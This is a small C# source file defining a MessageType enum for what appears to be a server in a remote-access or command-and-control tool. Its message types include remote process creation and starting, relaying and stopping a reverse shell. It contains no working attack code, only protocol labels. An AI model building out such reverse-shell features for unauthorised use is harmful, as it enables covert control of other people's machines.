namespace Server.Interop;

public enum MessageType : byte
{
    Chat = 0,
    Ping = 1,
    CreateProcessS = 2,
    StartReverseShell = 3,
    ReverseShellMessage = 4,
    StopReverseShell = 5
}